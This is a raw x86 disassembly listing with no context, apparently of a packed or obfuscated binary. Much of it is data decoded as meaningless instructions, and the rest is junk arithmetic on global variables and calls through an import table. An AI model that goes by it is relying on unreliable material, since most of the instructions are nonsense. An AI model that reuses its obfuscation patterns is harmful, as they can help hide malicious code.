  408d9e:	xor    BYTE PTR [esi+esi*8],dl
  408da1:	pop    ebp
  408da2:	sti    
  408da3:	xchg   DWORD PTR [eax+ecx*8],ebp
  408da6:	xor    bl,BYTE PTR [esi+0x61]
  408da9:	hlt    
  408daa:	cmp    BYTE PTR cs:[edx-0x40],ch
  408dae:	dec    esp
  408daf:	inc    eax
  408db0:	mov    fs,WORD PTR [ecx+0x70517676]
  408db6:	cmp    BYTE PTR [ebx-0x6d],bl
  408db9:	xor    al,0x2f
  408dbb:	adc    BYTE PTR [esi+0x66417830],bh
  408dc1:	(bad)  
  408dc2:	push   ss
  408dc3:	xchg   esi,eax
  408dc4:	in     al,0xca
  408dc6:	out    0xf3,eax
  408dc8:	retf   
  408dc9:	mov    edi,0xbe3be558
  408dce:	ds mov esp,0xac5722c5
  408dd4:	fwait
  408dd5:	outs   dx,DWORD PTR ds:[esi]
  408dd6:	jb     0x408e29
  408dd8:	stos   BYTE PTR es:[edi],al
  408dd9:	sub    al,0xd0
  408ddb:	cld    
  408ddc:	adc    BYTE PTR [eax+0x13b2f863],ah
  408de2:	adc    al,0x0
  408de4:	cmp    DWORD PTR [edx+0xa],0x42339782
  408deb:	push   edx
  408dec:	rep outs dx,BYTE PTR ds:[esi]
  408dee:	sub    DWORD PTR [esp+eiz*8-0xf32142],eax
  408df5:	mov    ebp,0x23931468
  408dfa:	add    al,0xf
  408dfc:	lahf   
  408dfd:	lods   eax,DWORD PTR ds:[esi]
  408dfe:	push   eax
  408dff:	cmp    BYTE PTR ds:0xea9460ef,bl
  408e05:	sub    BYTE PTR [edi],0xad
  408e08:	icebp  
  408e09:	popa   
  408e0a:	pop    ds
  408e0b:	into   
  408e0c:	call   0xefef:0x18b88d28
  408e13:	inc    ebx
  408e14:	adc    eax,0x4e56a28f
  408e19:	mov    dh,bh
  408e1b:	stos   DWORD PTR es:[edi],eax
  408e1c:	dec    ebp
  408e1d:	bound  edi,QWORD PTR [esi-0x33d62679]
  408e23:	xchg   esp,eax
  408e24:	xchg   ebp,eax
  408e25:	into   
  408e26:	inc    ebx
  408e27:	pop    es
  408e28:	aam    0xa6
  408e2a:	fwait
  408e2b:	cmp    esi,DWORD PTR [eax*4+0x61fbf712]
  408e32:	and    BYTE PTR [esi-0x1acb3139],ah
  408e38:	je     0x408eb0
  408e3a:	add    BYTE PTR [esp-0x7ea37aad],bl
  408e41:	out    0x71,al
  408e43:	loop   0x408e22
  408e45:	cmp    al,0x4
  408e47:	jmp    0x408dda
  408e49:	inc    ebx
  408e4a:	stos   BYTE PTR es:[edi],al
  408e4b:	jmp    0xae37:0x2954c3f7
  408e52:	icebp  
  408e53:	xor    eax,0xbf91a878
  408e58:	fs mov dl,dl
  408e5b:	mov    ebp,0xce9edd52
  408e60:	dec    ebp
  408e61:	popa   
  408e62:	push   ebp
  408e63:	or     DWORD PTR [ebx+0x58],ebp
  408e66:	(bad)  
  408e67:	jmp    FWORD PTR [eax+0x53]
  408e6a:	enter  0xa03d,0x20
  408e6e:	lds    esi,FWORD PTR ds:0xb82b2c93
  408e74:	in     al,0x5f
  408e76:	cmp    DWORD PTR [esi+0x3d7f9990],edi
  408e7c:	aas    
  408e7d:	fnstsw WORD PTR [ecx-0x7d]
  408e80:	in     al,dx
  408e81:	xor    bh,al
  408e83:	inc    ebp
  408e84:	call   0xcbba43ff
  408e89:	mov    eax,0x9c2b8ae8
  408e8e:	neg    ecx
  408e90:	mov    DWORD PTR [ebp-0x14],eax
  408e93:	adc    DWORD PTR ds:0x428449,0x14e
  408e9d:	jmp    0x40911c
  408ea2:	outs   dx,DWORD PTR ds:[esi]
  408ea3:	in     eax,0x49
  408ea5:	rcr    BYTE PTR [esp+esi*2+0x7b],1
  408ea9:	retw   
  408eab:	dec    ebx
  408eac:	jo     0x408e8b
  408eae:	lods   al,BYTE PTR ds:[esi]
  408eaf:	sub    edi,DWORD PTR [eax-0x4182855c]
  408eb5:	mov    esi,0xbebec279
  408eba:	lahf   
  408ebb:	cmp    eax,0x29ac91a2
  408ec0:	mov    cl,0x95
  408ec2:	xor    al,0xab
  408ec4:	dec    esp
  408ec5:	in     al,0x3
  408ec7:	inc    edi
  408ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ec9:	test   DWORD PTR [eax+eax*4+0x6abf8d96],esi
  408ed0:	mov    BYTE PTR [edx],al
  408ed2:	inc    edx
  408ed3:	dec    esi
  408ed4:	xor    dh,BYTE PTR [ebp+0x42]
  408ed7:	jmp    0xd0a2a2d7
  408edc:	inc    edi
  408edd:	adc    bh,BYTE PTR [ecx]
  408edf:	jbe    0x408e61
  408ee1:	(bad)  
  408ee2:	pop    esp
  408ee3:	or     eax,edx
  408ee5:	cmp    eax,0xd153b6d5
  408eea:	mov    bl,0x90
  408eec:	pushf  
  408eed:	push   cs
  408eee:	or     eax,DWORD PTR [esi]
  408ef0:	xchg   DWORD PTR [esi-0x73],edi
  408ef3:	test   esp,edx
  408ef5:	xor    BYTE PTR [ecx],cl
  408ef7:	pop    ds
  408ef8:	aam    0x3a
  408efa:	xor    eax,0xfb21ad85
  408eff:	mov    BYTE PTR [edx-0x36b7cc6c],al
  408f05:	pop    esi
  408f06:	pop    ds
  408f07:	fcom   DWORD PTR [ebp-0x23]
  408f0a:	aaa    
  408f0b:	lea    ebx,[esi+eiz*8]
  408f0e:	pop    esp
  408f0f:	jo     0x408ef9
  408f11:	retf   
  408f12:	dec    eax
  408f13:	pop    eax
  408f14:	dec    edx
  408f15:	pop    esi
  408f16:	jb     0x408f37
  408f18:	pop    edi
  408f19:	(bad)  
  408f1a:	ror    DWORD PTR [edi+0x58],1
  408f1d:	or     eax,0x8f598880
  408f22:	jmp    0x408f52
  408f24:	repnz aam 0x8f
  408f27:	dec    edx
  408f28:	mov    edx,0x810f7fda
  408f2d:	out    0xe0,eax
  408f2f:	xor    eax,0xaf2c4542
  408f34:	cmp    DWORD PTR [esi+0x76],esp
  408f37:	push   edi
  408f38:	sub    DWORD PTR [ebp+0x4c],edi
  408f3b:	pusha  
  408f3c:	or     ecx,ebx
  408f3e:	aam    0x3e
  408f40:	mov    esi,0x17c97feb
  408f45:	xchg   ebx,eax
  408f46:	pushf  
  408f47:	jmp    0x408fba
  408f49:	pop    ebp
  408f4a:	repz (bad) 
  408f4c:	push   ds
  408f4d:	call   0x7cc31d89
  408f52:	call   0x1174c2f7
  408f57:	mov    WORD PTR ds:0x9d56e712,gs
  408f5d:	jbe    0x408ef7
  408f5f:	arpl   WORD PTR [eax-0x62497891],bx
  408f65:	and    cl,dl
  408f67:	cdq    
  408f68:	xchg   DWORD PTR [ebp+0x58],edi
  408f6b:	or     DWORD PTR [edi+edi*1],ebp
  408f6e:	pop    edi
  408f6f:	ins    DWORD PTR es:[edi],dx
  408f70:	mov    dh,0xf2
  408f72:	and    al,BYTE PTR [edi+ecx*1-0x5d1a7d7c]
  408f79:	out    0x58,al
  408f7b:	and    cl,BYTE PTR [esi]
  408f7d:	cmp    cl,bh
  408f7f:	fwait
  408f80:	mov    edx,0xb03e2395
  408f85:	(bad)  [ebx]
  408f87:	fmul   st,st(6)
  408f89:	inc    edi
  408f8a:	loope  0x408f7a
  408f8c:	pop    es
  408f8d:	(bad)  
  408f8e:	pop    edi
  408f8f:	or     BYTE PTR [edi-0x3f059771],ah
  408f95:	sbb    BYTE PTR [edx+0x37],al
  408f98:	fnstenv [eax+0x57]
  408f9b:	addr16 out 0xb7,eax
  408f9e:	shl    BYTE PTR [edi+ebx*1],cl
  408fa1:	and    al,0x24
  408fa3:	dec    BYTE PTR [ebx-0x1ae57b1e]
  408fa9:	scas   al,BYTE PTR es:[edi]
  408faa:	xchg   edx,eax
  408fab:	sahf   
  408fac:	xor    BYTE PTR [ebp+0x4b1ee309],ah
  408fb2:	sbb    BYTE PTR [esi],cl
  408fb4:	mov    ds:0x8cb7ab85,al
  408fb9:	xor    ah,BYTE PTR [ebx]
  408fbb:	dec    eax
  408fbc:	aad    0x17
  408fbe:	sbb    al,0x92
  408fc0:	(bad)  
  408fc1:	dec    ecx
  408fc2:	sub    bh,BYTE PTR [esi+0x3a]
  408fc5:	sub    esi,DWORD PTR [esi]
  408fc7:	icebp  
  408fc8:	sub    dh,dl
  408fca:	jl     0x408fbb
  408fcc:	xor    eax,0x449938a7
  408fd1:	inc    eax
  408fd2:	xlat   BYTE PTR ds:[ebx]
  408fd3:	(bad)  
  408fd4:	(bad)  
  408fd5:	jg     0x408f99
  408fd7:	mov    cs,WORD PTR [edi+0x12b23437]
  408fdd:	jl     0x408fda
  408fdf:	dec    esp
  408fe0:	jo     0x408f8b
  408fe2:	test   eax,0xdb0ff21d
  408fe7:	push   0xb2cba47e
  408fec:	dec    edi
  408fed:	push   edi
  408fee:	test   bh,cl
  408ff0:	aas    
  408ff1:	clc    
  408ff2:	imul   esp,DWORD PTR [esi],0x60b0eb5f
  408ff8:	sbb    bl,BYTE PTR [ebx]
  408ffa:	mov    edx,0x27a1ba76
  408fff:	ret    
  409000:	js     0x408fe6
  409002:	test   DWORD PTR [ecx+0x1bd5a976],0x51140a0
  40900c:	push   edx
  40900d:	fdivr  st(0),st
  40900f:	ret    
  409010:	pop    ss
  409011:	mov    cl,0x61
  409013:	jo     0x408fdf
  409015:	add    esi,DWORD PTR [edx+0x41]
  409018:	mov    cl,BYTE PTR [edi]
  40901a:	push   ebp
  40901c:	std    
  40901d:	mov    esi,0x4ac4bbd7
  409022:	jb     0x409006
  409024:	sub    al,0x9d
  409026:	sbb    ah,BYTE PTR [ecx+0x48ffb070]
  40902c:	mov    dl,0x46
  40902e:	mov    ch,0x61
  409030:	add    eax,0x52c03b57
  409035:	adc    BYTE PTR [esi-0x6f],cl
  409038:	je     0x408fdb
  40903a:	dec    esi
  40903b:	push   ebx
  40903c:	adc    ch,BYTE PTR [ebp+ecx*4+0x62]
  409040:	add    BYTE PTR ds:0x9f57a911,bh
  409046:	cmp    ebx,ebp
  409048:	test   DWORD PTR [esi+0x7d],eax
  40904b:	cmp    cl,0x44
  40904e:	and    DWORD PTR [edi+eiz*2-0xbd78998],0x3f
  409056:	jbe    0x40904e
  409058:	sti    
  409059:	push   edi
  40905a:	sub    BYTE PTR [esi],bl
  40905c:	in     al,dx
  40905d:	pop    edi
  40905e:	call   0x22b0:0x70b44a2e
  409065:	push   esi
  409066:	jmp    0x4090d0
  409068:	sub    edx,ebp
  40906a:	xlat   BYTE PTR ds:[ebx]
  40906b:	adc    eax,0x6b24f7b3
  409070:	cwde   
  409071:	idiv   BYTE PTR [edx]
  409073:	pop    ebx
  409074:	sub    cl,bh
  409076:	addr16 mov al,al
  409079:	xor    eax,0x9032e063
  40907e:	xchg   ecx,eax
  40907f:	fstp   DWORD PTR [ebp-0x4b]
  409082:	mov    bh,BYTE PTR [esi]
  409084:	inc    ebx
  409085:	mov    DWORD PTR [esp+eiz*4],0x40dd20af
  40908c:	mov    al,0xde
  40908e:	or     al,0x97
  409090:	arpl   WORD PTR [ecx+0x3a],cx
  409093:	and    eax,0xa4ed88cf
  409098:	or     BYTE PTR [ebx+0x3e],bh
  40909b:	push   0xd7f53e41
  4090a0:	mov    cl,BYTE PTR [edi-0x62ee96d7]
  4090a6:	xchg   BYTE PTR [edi+0x45],ah
  4090a9:	add    eax,0xab4c0593
  4090ae:	adc    al,ah
  4090b0:	stc    
  4090b1:	(bad)  
  4090b2:	xor    edx,ecx
  4090b4:	stos   DWORD PTR es:[edi],eax
  4090b5:	ror    DWORD PTR [edx-0x5fea420d],cl
  4090bb:	push   esi
  4090bc:	ror    DWORD PTR [ecx-0x2f],0x52
  4090c0:	xchg   ecx,eax
  4090c1:	xchg   DWORD PTR [ebx-0x45db3b83],eax
  4090c7:	mov    dl,0xb8
  4090c9:	mov    eax,0xa2505d18
  4090ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090cf:	div    DWORD PTR [esi-0x33]
  4090d2:	ja     0x40908b
  4090d4:	in     eax,dx
  4090d5:	pop    ecx
  4090d6:	pop    DWORD PTR [esi-0x2b9997ad]
  4090dc:	mov    al,0xce
  4090de:	das    
  4090df:	adc    BYTE PTR [esi],ch
  4090e1:	or     al,0x15
  4090e3:	mov    ds:0xe4304413,eax
  4090e8:	adc    DWORD PTR [ecx],edi
  4090ea:	mov    al,bl
  4090ec:	xor    bl,BYTE PTR [ecx-0x731fe806]
  4090f2:	(bad)
  4090f5:	xchg   DWORD PTR [edx-0x6277e976],esi
  4090fb:	cmp    esi,DWORD PTR ds:0x2b6df042
  409101:	cld    
  409102:	sub    DWORD PTR [esi],ebx
  409104:	(bad)  
  409105:	mov    dh,0x35
  409107:	cmp    eax,esi
  409109:	rcl    al,1
  40910b:	add    DWORD PTR ds:0xc468723e,ecx
  409111:	and    edx,DWORD PTR [edx-0x569b1dde]
  409117:	jns    0x409194
  409119:	sub    dl,BYTE PTR [ecx-0x7c]
  40911c:	mov    DWORD PTR [ebp-0x30],0xcb79b572
  409123:	mov    DWORD PTR [ebp-0x2c],eax
  409126:	cmp    DWORD PTR ds:0x428571,0x0
  40912d:	mov    DWORD PTR ds:0x42856d,0x24a6
  409137:	mov    DWORD PTR ds:0x428421,0x40da
  409141:	jmp    0x4091a4
  409146:	not    eax
  409148:	mov    DWORD PTR ds:0x4284c5,0x7db9
  409152:	cmp    DWORD PTR ds:0x428571,0x0
  409159:	jae    0x409182
  40915f:	push   0x1999
  409164:	push   0x428147
  409169:	push   0x4282f3
  40916e:	call   DWORD PTR ds:0x42e0c8
  409174:	sub    ecx,DWORD PTR ds:0x428369
  40917a:	and    ecx,ecx
  40917c:	adc    DWORD PTR ds:0x428409,ebx
  409182:	mov    ecx,DWORD PTR ds:0x428471
  409188:	add    DWORD PTR ds:0x428341,ecx
  40918e:	neg    DWORD PTR ds:0x428335
  409194:	xor    DWORD PTR ds:0x4284f5,ebx
  40919a:	or     DWORD PTR ds:0x428429,0x673
  4091a4:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  4091ab:	mov    DWORD PTR [ebp-0x24],0x29bd2
  4091b2:	mov    DWORD PTR [ebp-0x20],0x6ec3
  4091b9:	sbb    eax,ecx
  4091bb:	push   esi
  4091bc:	mov    DWORD PTR [ebp-0x1c],0x2a74
  4091c3:	xor    ecx,ecx
  4091c5:	xor    ecx,DWORD PTR ds:0x4283b9
  4091cb:	mov    eax,ds:0x42852d
  4091d0:	sub    ecx,eax
  4091d2:	or     ecx,DWORD PTR [ecx+eax*1]
  4091d5:	mov    DWORD PTR [ebp-0x10],0x2e2c
  4091dc:	push   0x5285
  4091e1:	or     DWORD PTR ds:0x428341,ecx
  4091e7:	mov    DWORD PTR [ebp-0xc],0x3d0a
  4091ee:	and    ecx,ecx
  4091f0:	mov    eax,DWORD PTR [ebp-0x10]
  4091f3:	and    ecx,DWORD PTR ds:0x4284f1
  4091f9:	mov    ecx,DWORD PTR [ebp-0xc]
  4091fc:	sub    DWORD PTR ds:0x4284f1,0x428579
  409206:	push   0x712c
  40920b:	or     DWORD PTR ds:0x4284fd,0x428419
  409215:	push   ecx
  409216:	sbb    DWORD PTR ds:0x4284ed,0x3312
  409220:	push   eax
  409221:	call   0x41594e
  409226:	and    DWORD PTR ds:0x4284ed,edi
  40922c:	mov    ecx,DWORD PTR [ebp-0x20]
  40922f:	mov    esi,DWORD PTR [ebp-0x1c]
  409232:	and    DWORD PTR ds:0x4284f9,0x428411
  40923c:	push   0x5f43
  409241:	and    DWORD PTR ds:0x428441,0x42855d
  40924b:	or     edx,0x69b4
  409251:	push   0x1657
  409256:	or     eax,0x528b
  40925b:	xor    edx,esi
  40925d:	xor    eax,ecx
  40925f:	xor    DWORD PTR ds:0x428425,0x4284c9
  409269:	push   edx
  40926a:	push   eax
  40926b:	or     DWORD PTR ds:0x428369,0x42c0
  409275:	call   0x41594e
  40927a:	mov    esi,DWORD PTR ds:0x42842d
  409280:	xor    esi,DWORD PTR ds:0x428465
  409286:	mov    DWORD PTR ds:0x42842d,esi
  40928c:	mov    ecx,DWORD PTR [ebp-0x28]
  40928f:	and    esi,DWORD PTR ds:0x428569
  409295:	jmp    0x409514
  40929a:	aam    0x9e
  40929c:	jp     0x409286
  40929e:	mov    esp,0xba543b
  4092a3:	ret    0x923c
  4092a6:	ret    0x6a4
  4092a9:	xchg   edx,eax
  4092aa:	xor    eax,0x79bebe83
  4092af:	ret    0xbebe
  4092b2:	or     BYTE PTR [ebx-0x19],ah
  4092b5:	fcomp  QWORD PTR [ebx-0x54c8255f]
  4092bb:	or     BYTE PTR [ebp+ebp*4+0x6e957f44],ch
  4092c2:	sub    DWORD PTR [ebp-0x51],ebp
  4092c5:	sbb    eax,0x2091d9be
  4092ca:	add    bh,ch
  4092cc:	daa    
  4092cd:	pop    eax
  4092ce:	pop    eax
  4092cf:	(bad)  
  4092d0:	mul    bh
  4092d2:	test   BYTE PTR [esi-0x7d],ch
  4092d5:	sbb    dl,BYTE PTR [ecx-0x2c]
  4092d8:	dec    esp
  4092d9:	or     BYTE PTR [ecx+0x448cd99],dl
  4092df:	cmp    al,0x79
  4092e1:	pop    es
  4092e2:	sti    
  4092e3:	jnp    0x4092f0
  4092e5:	jg     0x40935b
  4092e7:	mov    bl,cl
  4092e9:	sbb    ebp,eax
  4092eb:	xor    ah,BYTE PTR [ebx]
  4092ed:	mov    al,0x6c
  4092ef:	test   eax,0x5fbc00dd
  4092f4:	out    0xab,al
  4092f6:	pushf  
  4092f7:	dec    ecx
  4092f8:	mul    DWORD PTR [edi+0x6038ff43]
  4092fe:	xchg   ebp,eax
  4092ff:	adc    ch,ch
  409301:	imul   esp,DWORD PTR [esi+0x7d73ee69],0xffffff94
  409308:	sbb    al,0x9a
  40930a:	rcl    ebx,1
  40930c:	mov    al,0x88
  40930e:	fwait
  40930f:	pop    esp
  409310:	xchg   ebx,eax
  409311:	jge    0x40938a
  409313:	lock stc 
  409315:	xor    esi,DWORD PTR [esi]
  409317:	xor    eax,0xd1fe3974
  40931c:	pop    eax
  40931d:	mov    ds:0x47c0f4d8,al
  409322:	adc    al,0x71
  409325:	(bad)  
  409326:	mov    edi,0x8cd05040
  40932b:	sub    al,0x39
  40932d:	dec    edx
  40932e:	add    eax,0x29db9614
  409333:	ret    
  409334:	xlat   BYTE PTR ds:[ebx]
  409335:	fwait
  409336:	jbe    0x409337
  409338:	mov    eax,0x42fa5466
  40933d:	retf   
  40933e:	dec    DWORD PTR [esp+esi*4+0x25]
  409342:	mov    edi,0xbd3cc069
  409347:	pop    esp
  409348:	xchg   ebx,eax
  409349:	add    esi,DWORD PTR [edi+ebx*1+0x44]
  40934d:	cli    
  40934e:	ret    
  40934f:	sub    eax,0xf346979c
  409354:	(bad)  
  409355:	mov    edi,DWORD PTR [esp+eax*8+0x4a]
  409359:	call   0x4a1d6f72
  40935e:	repz shr DWORD PTR [eax],cl
  409361:	enter  0x37cb,0x3b
  409365:	xchg   ah,al
  409367:	jnp    0x40933b
  409369:	in     eax,0xf
  40936b:	push   edx
  40936c:	push   edi
  40936d:	jnp    0x4093aa
  40936f:	cs push edi
  409371:	aaa    
  409372:	ss clc 
  409374:	cmp    al,0x95
  409376:	pop    ecx
  409377:	xor    DWORD PTR [ecx-0x4a586416],0x113879b
  409381:	enter  0xc863,0x9a
  409385:	cwde   
  409386:	push   esp
  409387:	jb     0x4093fd
  409389:	add    edx,edi
  40938b:	xor    eax,DWORD PTR ds:0x315c0dfc
  409391:	test   BYTE PTR [ecx+0x5be299d1],dl
  409397:	jecxz  0x409407
  409399:	loope  0x4093eb
  40939b:	sub    al,0xc1
  40939d:	into   
  40939e:	add    BYTE PTR [edi-0x2e],dl
  4093a1:	dec    esi
  4093a2:	popf   
  4093a3:	and    al,0x67
  4093a5:	popa   
  4093a6:	adc    bh,dl
  4093a8:	dec    esp
  4093a9:	jne    0x409402
  4093ab:	aaa    
  4093ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093ad:	xchg   edx,eax
  4093ae:	mov    cl,0xf3
  4093b0:	in     eax,0x8b
  4093b2:	mov    dh,0x31
  4093b4:	xchg   ebx,eax
  4093b5:	mov    ds:0xe28f76d7,al
  4093ba:	add    al,0x17
  4093bc:	mov    ah,0x86
  4093be:	jmp    0xafefbe76
  4093c3:	push   ebx
  4093c4:	push   ecx
  4093c5:	sbb    eax,0xe71bc188
  4093ca:	pop    edi
  4093cb:	push   cs
  4093cc:	dec    esp
  4093cd:	jmp    0x409387
  4093cf:	int3   
  4093d0:	repz sbb cl,0xd7
  4093d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093d5:	xchg   edx,eax
  4093d6:	sbb    eax,0x5b144ce5
  4093db:	jno    0x4093d4
  4093dd:	push   ds
  4093de:	add    eax,0xd29b052c
  4093e3:	push   cs
  4093e4:	pavgb  mm6,QWORD PTR [ebp+0x49da7607]
  4093eb:	dec    eax
  4093ec:	aaa    
  4093ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ef:	xor    BYTE PTR [ebx-0x4d4919ff],ah
  4093f5:	xchg   ebp,eax
  4093f6:	call   0x6d407511
  4093fb:	add    dh,BYTE PTR [ecx]
  4093fd:	push   0xd97965dc
  409402:	(bad)  
  409403:	fisttp DWORD PTR [edi-0x3f46c360]
  409409:	sub    ebp,DWORD PTR [edx-0x29ebd370]
  40940f:	mov    WORD PTR [ecx+eax*8],es
  409412:	lods   eax,DWORD PTR ds:[esi]
  409413:	dec    edi
  409414:	gs loop 0x409465
  409417:	add    al,0x89
  409419:	and    eax,DWORD PTR [ecx]
  40941b:	adc    DWORD PTR [edi],esi
  40941d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40941e:	adc    ch,BYTE PTR [edx]
  409420:	fcomp  st(1)
  409422:	adc    DWORD PTR [ecx-0x2a],0xf171cebe
  409429:	fst    QWORD PTR [esi]
  40942b:	pusha  
  40942c:	mov    ecx,0x9e12c3f4
  409431:	add    al,0xcd
  409433:	push   ds
  409434:	inc    esi
  409435:	push   edx
  409436:	xchg   ecx,eax
  409437:	sub    bl,BYTE PTR [ecx+0x184e4adf]
  40943d:	ins    DWORD PTR es:[edi],dx
  40943e:	xchg   esi,eax
  40943f:	int    0x4a
  409441:	mov    bh,BYTE PTR [edx]
  409443:	fisttp DWORD PTR [ebp-0x20]
  409446:	in     al,dx
  409447:	push   ecx
  409448:	cli    
  409449:	xor    DWORD PTR [eax*8+0x243a3b74],ebx
  409450:	mov    al,0xf2
  409452:	push   esi
  409453:	inc    ecx
  409454:	pop    ebx
  409455:	sbb    al,0xb3
  409457:	inc    eax
  409458:	outs   dx,DWORD PTR ds:[esi]
  409459:	aaa    
  40945a:	iret   
  40945b:	mov    esp,esi
  40945d:	pop    esi
  40945e:	jecxz  0x4093fa
  409460:	test   DWORD PTR [edx+0x61ace19a],edx
  409466:	fxch   st(2)
  409468:	inc    esi
  409469:	in     eax,dx
  40946a:	push   esi
  40946b:	push   0xeff4fe44
  409470:	and    esp,DWORD PTR [eax-0x29]
  409473:	call   0x906cf0fe
  409478:	(bad)  
  409479:	xchg   DWORD PTR [ebp-0x22],ecx
  40947c:	adc    ah,BYTE PTR [edi+0x13dbaef4]
  409482:	mov    dh,0x9b
  409484:	test   eax,0x660eaa6e
  409489:	inc    ebx
  40948a:	mov    bh,0xec
  40948c:	ss cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40948f:	xchg   edx,eax
  409490:	dec    eax
  409491:	sub    eax,0xe6ae916d
  409496:	adc    eax,0x75771565
  40949b:	enter  0xcc66,0xcb
  40949f:	cmp    BYTE PTR [edi],dh
  4094a1:	imul   esi,DWORD PTR [ebp-0x2e579142],0x54
  4094a8:	loope  0x409435
  4094aa:	xchg   DWORD PTR [ebp+0x56],edi
  4094ad:	lea    ecx,[ebx]
  4094af:	stc    
  4094b0:	pop    ss
  4094b1:	mov    WORD PTR [ebx-0x6f72a8b5],ds
  4094b7:	sti    
  4094b8:	mov    esi,0x78c9e499
  4094bd:	jo     0x4094f9
  4094bf:	std    
  4094c0:	and    eax,0x6b14a5df
  4094c5:	adc    dl,BYTE PTR ds:0x63b60d42
  4094cb:	adc    DWORD PTR [ebx],esi
  4094cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ce:	(bad)  
  4094d0:	push   edx
  4094d1:	cwde   
  4094d2:	fnstenv [esi+0x279442ab]
  4094d8:	cwde   
  4094d9:	scas   al,BYTE PTR es:[edi]
  4094da:	mov    al,0xa6
  4094dc:	and    DWORD PTR [ecx-0x4f956c1a],esi
  4094e2:	mov    ebp,0x291feb89
  4094e7:	push   esp
  4094e8:	push   edx
  4094e9:	and    al,0xe7
  4094eb:	sbb    DWORD PTR [ecx+0x4b896612],0xffffffc7
  4094f2:	push   edx
  4094f3:	cwde   
  4094f4:	dec    edi
  4094f5:	mov    al,ss:0x9a71031f
  4094fb:	icebp  
  4094fc:	jmp    0xa7d3:0xe189e111
  409503:	jo     0x4094b1
  409505:	xor    eax,0xaf418656
  40950a:	inc    esi
  40950b:	push   0xbca3667f
  409510:	jmp    0x40953c
  409512:	hlt    
  409513:	sbb    ecx,DWORD PTR [ebx+0x1581dc75]
  409519:	dec    ebp
  40951a:	add    DWORD PTR [edx+0x0],0xffffffcb
  40951e:	popa   
  40951f:	add    BYTE PTR [eax],al
  409521:	push   esi
  409522:	dec    DWORD PTR ds:0x428341
  409528:	push   ecx
  409529:	not    DWORD PTR ds:0x428551
  40952f:	push   edx
  409530:	adc    DWORD PTR ds:0x428451,0x42846d
  40953a:	push   eax
  40953b:	sbb    DWORD PTR ds:0x428345,0x42834d
  409545:	call   0x422286
  40954a:	mov    DWORD PTR [ebp-0x30],eax
  40954d:	cmp    DWORD PTR ds:0x428439,0x0
  409554:	mov    ecx,0x19e0
  409559:	mov    DWORD PTR ds:0x428549,0x71a7
  409563:	mov    ecx,0x1714
  409568:	jmp    0x4095c4
  40956d:	movzx  eax,BYTE PTR ds:0x428435
  409574:	mov    eax,0x70fc
  409579:	cmp    DWORD PTR ds:0x428439,0x0
  409580:	jb     0x4095ac
  409586:	push   0x428451
  40958b:	push   0x4282f3
  409590:	call   DWORD PTR ds:0x42e24c
  409596:	and    DWORD PTR ds:0x42855d,0x600c
  4095a0:	add    ecx,DWORD PTR ds:0x42844d
  4095a6:	or     ecx,DWORD PTR ds:0x428465
  4095ac:	adc    ecx,esi
  4095ae:	sbb    DWORD PTR ds:0x4284ed,edx
  4095b4:	sbb    DWORD PTR ds:0x428441,0x1a7e
  4095be:	add    esi,0x6267
  4095c4:	mov    DWORD PTR [ebp-0x2c],edx
  4095c7:	mov    DWORD PTR [ebp-0x10],0x5fa8
  4095ce:	mov    DWORD PTR [ebp-0xc],0x1751
  4095d5:	or     DWORD PTR ds:0x428465,0x428581
  4095df:	mov    DWORD PTR [ebp-0x20],0x5e90
  4095e6:	sub    DWORD PTR ds:0x428415,ecx
  4095ec:	mov    DWORD PTR [ebp-0x1c],0xfc1
  4095f3:	mov    edx,DWORD PTR ds:0x4283e9
  4095f9:	mov    edx,DWORD PTR [edx]
  4095fb:	adc    DWORD PTR ds:0x42835d,edx
  409601:	mov    DWORD PTR [ebp-0x28],0x7044
  409608:	or     DWORD PTR ds:0x42842d,0x3ffc
  409612:	mov    DWORD PTR [ebp-0x24],0x7bf
  409619:	mov    eax,DWORD PTR [ebp-0x28]
  40961c:	adc    ecx,0x6b26
  409622:	mov    ecx,DWORD PTR [ebp-0x24]
  409625:	add    DWORD PTR ds:0x428571,edi
  40962b:	mov    edx,DWORD PTR [ebp-0x20]
  40962e:	cmp    DWORD PTR ds:0x428435,0x0
  409635:	mov    DWORD PTR ds:0x42843d,edi
  40963b:	mov    DWORD PTR ds:0x428405,ecx
  409641:	mov    DWORD PTR ds:0x428445,0x2db2
  40964b:	jmp    0x409715
  409650:	mov    esi,DWORD PTR ds:0x428441
  409656:	mov    DWORD PTR ds:0x4284d9,ebx
  40965c:	cmp    DWORD PTR ds:0x428435,0x0
  409663:	jg     0x409686
  409669:	push   0x3d0d
  40966e:	call   DWORD PTR ds:0x42e000
  409674:	xor    DWORD PTR ds:0x428439,ecx
  40967a:	sbb    DWORD PTR ds:0x428435,edi
  409680:	dec    DWORD PTR ds:0x428349
  409686:	mov    esi,DWORD PTR ds:0x428335
  40968c:	xor    DWORD PTR ds:0x4284dd,esi
  409692:	and    DWORD PTR ds:0x4284e5,ecx
  409698:	dec    esi
  409699:	cmp    DWORD PTR ds:0x4284e9,0x0
  4096a0:	mov    DWORD PTR ds:0x4284f1,0x1a91
  4096aa:	movzx  esi,BYTE PTR ds:0x428341
  4096b1:	mov    esi,0x63fe
  4096b6:	jmp    0x409715
  4096bb:	mov    DWORD PTR ds:0x42842d,0x20e7
  4096c5:	cmp    DWORD PTR ds:0x4284e9,0x0
  4096cc:	jae    0x4096f5
  4096d2:	push   DWORD PTR [ebp-0x20]
  4096d5:	push   0x278f
  4096da:	push   DWORD PTR [ebp-0x1c]
  4096dd:	call   DWORD PTR ds:0x42e004
  4096e3:	or     esi,DWORD PTR ds:0x4284d1
  4096e9:	sbb    esi,DWORD PTR ds:0x4284c5
  4096ef:	and    DWORD PTR ds:0x42832d,edx
  4096f5:	dec    DWORD PTR ds:0x428569
  4096fb:	or     esi,0x67c0
  409701:	add    DWORD PTR ds:0x428415,0x146d
  40970b:	sbb    DWORD PTR ds:0x428565,0xdcf
  409715:	mov    esi,DWORD PTR [ebp-0x1c]
  409718:	add    eax,0x355c
  40971d:	mov    DWORD PTR ds:0x42836d,0x28d
  409727:	adc    ecx,0x819
